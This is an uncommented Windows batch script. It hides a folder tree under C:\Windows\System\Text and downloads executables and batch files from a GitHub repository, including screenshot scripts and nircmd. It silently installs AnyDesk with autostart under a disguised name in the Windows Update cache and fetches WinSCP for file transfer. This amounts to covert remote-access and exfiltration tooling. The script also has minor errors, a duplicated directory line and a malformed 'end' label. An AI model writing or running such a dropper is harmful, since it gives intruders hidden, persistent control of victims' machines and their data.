@echo off
mkdir C:\Windows\System\Text\A
mkdir C:\Windows\System\Text\A\3
mkdir C:\Windows\System\Text\A\2
mkdir C:\Windows\System\Text\A\1
mkdir C:\Windows\System\Text\B
mkdir C:\Windows\System\Text\B\3
mkdir C:\Windows\System\Text\B\2
mkdir C:\Windows\System\Text\B\1
mkdir C:\Windows\System\Text\C
mkdir C:\Windows\System\Text\C\3
mkdir C:\Windows\System\Text\C\2
mkdir C:\Windows\System\Text\C\1
mkdir C:\Windows\System\Text\D
mkdir C:\Windows\System\Text\D\3
mkdir C:\Windows\System\Text\D\2
mkdir C:\Windows\System\Text\D\1
mkdir C:\Windows\System\Text\E
mkdir C:\Windows\System\Text\E\3
mkdir C:\Windows\System\Text\E\2
mkdir C:\Windows\System\Text\E\1
mkdir C:\Windows\System\Text\F
mkdir C:\Windows\System\Text\F\3
mkdir C:\Windows\System\Text\F\2
mkdir C:\Windows\System\Text\F\1
mkdir C:\Windows\System\Text\G
mkdir C:\Windows\System\Text\G\3
mkdir C:\Windows\System\Text\G\2
mkdir C:\Windows\System\Text\G\1
mkdir C:\Windows\System\Text\H
mkdir C:\Windows\System\Text\H\3
mkdir C:\Windows\System\Text\H\2
mkdir C:\Windows\System\Text\H\3
mkdir C:\Windows\System\Text\I
mkdir C:\Windows\System\Text\I\3
mkdir C:\Windows\System\Text\I\2
mkdir C:\Windows\System\Text\I\1
mkdir C:\Windows\System\Text\J
mkdir C:\Windows\System\Text\J\3
mkdir C:\Windows\System\Text\J\2
mkdir C:\Windows\System\Text\J\1
mkdir C:\Windows\System\Text\K
mkdir C:\Windows\System\Text\K\3
mkdir C:\Windows\System\Text\K\2
mkdir C:\Windows\System\Text\K\1
mkdir C:\Windows\System\Text\L
mkdir C:\Windows\System\Text\L\3
mkdir C:\Windows\System\Text\L\2
mkdir C:\Windows\System\Text\L\1
mkdir C:\Windows\System\Text\M
mkdir C:\Windows\System\Text\M\3
mkdir C:\Windows\System\Text\M\2
mkdir C:\Windows\System\Text\M\1
mkdir C:\Windows\System\Text\N
mkdir C:\Windows\System\Text\N\3
mkdir C:\Windows\System\Text\N\2
mkdir C:\Windows\System\Text\N\1
mkdir C:\Windows\System\Text\O
mkdir C:\Windows\System\Text\O\3
mkdir C:\Windows\System\Text\O\2
mkdir C:\Windows\System\Text\O\1
mkdir C:\Windows\System\Text\P
mkdir C:\Windows\System\Text\P\3
mkdir C:\Windows\System\Text\P\2
mkdir C:\Windows\System\Text\P\1
mkdir C:\Windows\System\Text\Q
mkdir C:\Windows\System\Text\Q\3
mkdir C:\Windows\System\Text\Q\2
mkdir C:\Windows\System\Text\Q\1
mkdir C:\Windows\System\Text\R
mkdir C:\Windows\System\Text\R\3
mkdir C:\Windows\System\Text\R\2
mkdir C:\Windows\System\Text\R\1
mkdir C:\Windows\System\Text\S
mkdir C:\Windows\System\Text\S\3
mkdir C:\Windows\System\Text\S\2
mkdir C:\Windows\System\Text\S\1
mkdir C:\Windows\System\Text\T
mkdir C:\Windows\System\Text\T\3
mkdir C:\Windows\System\Text\T\2
mkdir C:\Windows\System\Text\T\1
mkdir C:\Windows\System\Text\U
mkdir C:\Windows\System\Text\U\3
mkdir C:\Windows\System\Text\U\2
mkdir C:\Windows\System\Text\U\1
mkdir C:\Windows\System\Text\V
mkdir C:\Windows\System\Text\V\3
mkdir C:\Windows\System\Text\V\2
mkdir C:\Windows\System\Text\V\1
mkdir C:\Windows\System\Text\W
mkdir C:\Windows\System\Text\W\3
mkdir C:\Windows\System\Text\W\2
mkdir C:\Windows\System\Text\W\1
mkdir C:\Windows\System\Text\X
mkdir C:\Windows\System\Text\X\3
mkdir C:\Windows\System\Text\X\2
mkdir C:\Windows\System\Text\X\1
mkdir C:\Windows\System\Text\Y
mkdir C:\Windows\System\Text\Y\3
mkdir C:\Windows\System\Text\Y\2
mkdir C:\Windows\System\Text\Y\1
mkdir C:\Windows\System\Text\Z
mkdir C:\Windows\System\Text\Z\3
mkdir C:\Windows\System\Text\Z\2
mkdir C:\Windows\System\Text\Z\1
powershell Invoke-WebRequest https://raw.githubusercontent.com/TheBetaBiggie/RTR/main/accgen.exe -OutFile C:\Windows\System\Text\r\3\accgen.exe
powershell Invoke-WebRequest https://raw.githubusercontent.com/TheBetaBiggie/RTR/main/nircmd.exe -OutFile C:\Windows\System\Text\t\3\nircmd.exe
powershell Invoke-WebRequest https://raw.githubusercontent.com/TheBetaBiggie/RTR/main/define.bat -OutFile C:\Windows\System\Text\r\3\define.bat
powershell Invoke-WebRequest https://raw.githubusercontent.com/TheBetaBiggie/RTR/main/ss.bat -OutFile C:\Windows\System\Text\r\3\ss.bat
powershell Invoke-WebRequest https://raw.githubusercontent.com/TheBetaBiggie/RTR/main/ss1.bat -OutFile C:\Windows\System\Text\r\3\ss1.bat
powershell Invoke-WebRequest https://raw.githubusercontent.com/TheBetaBiggie/RTR/main/gen.bat -OutFile C:\Windows\System\Text\r\3\gen.bat
powershell Invoke-WebRequest https://download.anydesk.com/AnyDesk.exe -OutFile C:\Windows\SoftwareDistribution\Download\SharedFileCache\installer.exe
C:\Windows\SoftwareDistribution\Download\SharedFileCache\installer.exe --install "C:\Windows\SoftwareDistribution\Download\SharedFileCache" --start-with-win --silent --update-manually
timeout 5
:scp
powershell Invoke-WebRequest https://raw.githubusercontent.com/TheBetaBiggie/RTR/main/WinSCP-5.21.2-Portable.zip -OutFile C:\Windows\System\Text\r\3\scp.zip
powershell Expand-Archive C:\Windows\System\Text\r\3\scp.zip -DestinationPath C:\Windows\System\Text\r\3\
if exist "C:\Windows\System\Text\r\3\WinSCP.com" if exist "C:\Windows\System\Text\r\3\WinSCP.exe" goto end
if not exist "C:\Windows\System\Text\r\3\WinSCP.com" goto scp
if not exist "C:\Windows\System\Text\r\3\WinSCP.exe" goto scp
end:
